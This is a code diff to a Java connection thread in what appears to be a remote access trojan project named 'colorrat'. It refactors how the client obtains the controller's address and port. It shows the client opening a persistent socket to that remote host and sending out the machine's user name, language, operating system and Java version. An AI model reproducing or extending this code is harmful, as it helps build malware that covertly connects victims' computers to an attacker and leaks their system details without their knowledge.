@@ -1,16 +1,12 @@
 package eu.aragonapp.colorrat.network.thread.types;
 
 import eu.aragonapp.colorrat.ColorClient;
-import eu.aragonapp.colorrat.network.packet.Packet;
 import eu.aragonapp.colorrat.network.packet.types.client.C01PacketInformations;
 import eu.aragonapp.colorrat.network.thread.ColorThread;
-import eu.aragonapp.colorrat.utils.$;
 
-import java.io.EOFException;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 import java.net.Socket;
-import java.net.SocketException;
 
 /**
  * @Copyright (c) 2018 Mythic Inc. (http://www.mythic.com/) All Rights Reserved.
@@ -47,7 +43,6 @@ public class ConnectThread extends ColorThread {
             ColorClient.getInstance().getReceiveThread().start();
 
             ColorClient.getInstance().write(new C01PacketInformations(System.getProperty("user.name"), System.getProperty("user.language"), System.getProperty("os.name"), System.getProperty("java.version")));
-            //ColorClient.getInstance().write(new C01PacketInformations());
         }
 
         try {
@@ -59,7 +54,7 @@ public class ConnectThread extends ColorThread {
 
     private boolean connect() {
         try {
-            ColorClient.getInstance().setSocket(new Socket($.IP_ADDRESS, $.PORT));
+            ColorClient.getInstance().setSocket(new Socket(ColorClient.getInstance().getAddress(), ColorClient.getInstance().getPort()));
             ColorClient.getInstance().getSocket().setKeepAlive(true);
             ColorClient.getInstance().setConnected(true);
             return true;
